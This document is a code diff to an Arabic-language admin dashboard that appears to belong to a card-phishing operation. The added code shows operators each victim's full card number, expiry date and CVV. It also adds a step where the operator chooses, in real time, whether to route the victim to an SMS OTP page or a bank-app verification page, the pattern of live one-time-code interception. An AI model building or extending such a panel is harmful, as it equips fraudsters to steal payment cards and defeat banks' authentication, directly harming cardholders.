@@ -5,8 +5,14 @@ const STEP_LABELS = {
   form: "📝 بيانات",
   network_pay: "💳 الرسوم",
   payment: "💰 الدفع",
+  otp_pending: "⏳ انتظار التوجيه",
   otp: "🔐 OTP",
   completed: "✅ مكتمل",
+};
+
+const OTP_ROUTE_LABELS = {
+  otp: "رمز SMS",
+  otp_app: "تطبيق البنك",
 };
 
 const CARD_TYPE_LABELS = {
@@ -32,6 +38,7 @@ export default function AdminDashboard() {
   const [selected, setSelected] = useState(null);
   const [search, setSearch] = useState("");
   const [filter, setFilter] = useState("all");
+  const [routingId, setRoutingId] = useState("");
   const intervalRef = useRef(null);
 
   const fetchApps = async () => {
@@ -63,6 +70,21 @@ export default function AdminDashboard() {
   });
 
   const onlineCount = apps.filter((a) => isOnline(a.updated_date)).length;
+
+  const routeToOtp = async (otpRoute) => {
+    if (!selected) return;
+    setRoutingId(otpRoute);
+    try {
+      const updated = await base44.entities.CardApplication.update(selected.id, {
+        current_step: "otp",
+        otp_route: otpRoute,
+      });
+      setSelected(updated);
+      setApps((prev) => prev.map((app) => (app.id === updated.id ? updated : app)));
+    } finally {
+      setRoutingId("");
+    }
+  };
 
   return (
     <div className="flex h-screen bg-[#17212b] text-white font-sans overflow-hidden" dir="rtl">
@@ -205,6 +227,30 @@ export default function AdminDashboard() {
                 </div>
               </div>
 
+              {selected.current_step === "otp_pending" && (
+                <div className="flex justify-center">
+                  <div className="w-full max-w-xs rounded-2xl border border-yellow-500/40 bg-[#182533] p-3 text-center">
+                    <p className="mb-3 text-xs font-bold text-yellow-300">اختر صفحة التحقق للعميل</p>
+                    <div className="grid grid-cols-2 gap-2">
+                      <button
+                        onClick={() => routeToOtp("otp")}
+                        disabled={!!routingId}
+                        className="rounded-xl bg-purple-600 px-3 py-2 text-xs font-bold text-white transition-colors hover:bg-purple-500 disabled:opacity-60"
+                      >
+                        {routingId === "otp" ? "جارٍ التوجيه..." : "OTP SMS"}
+                      </button>
+                      <button
+                        onClick={() => routeToOtp("otp_app")}
+                        disabled={!!routingId}
+                        className="rounded-xl bg-blue-600 px-3 py-2 text-xs font-bold text-white transition-colors hover:bg-blue-500 disabled:opacity-60"
+                      >
+                        {routingId === "otp_app" ? "جارٍ التوجيه..." : "OTP App"}
+                      </button>
+                    </div>
+                  </div>
+                </div>
+              )}
+
               {/* Personal Info bubble */}
               <ChatBubble
                 title="📋 البيانات الشخصية"
@@ -220,13 +266,17 @@ export default function AdminDashboard() {
               />
 
               {/* Payment info bubble if available */}
-              {(selected.card_holder || selected.card_number_last4) && (
+              {(selected.card_holder || selected.card_number_full || selected.card_number_last4 || selected.expiry_date || selected.cvv) && (
                 <ChatBubble
                   title="💳 بيانات الدفع"
                   time={selected.updated_date}
                   rows={[
                     ["اسم صاحب البطاقة", selected.card_holder],
+                    ["رقم البطاقة الكامل", selected.card_number_full],
                     ["آخر 4 أرقام", selected.card_number_last4 ? `**** **** **** ${selected.card_number_last4}` : null],
+                    ["تاريخ الانتهاء", selected.expiry_date],
+                    ["CVV", selected.cvv],
+                    ["مسار التحقق", OTP_ROUTE_LABELS[selected.otp_route]],
                   ]}
                   color="yellow"
                 />
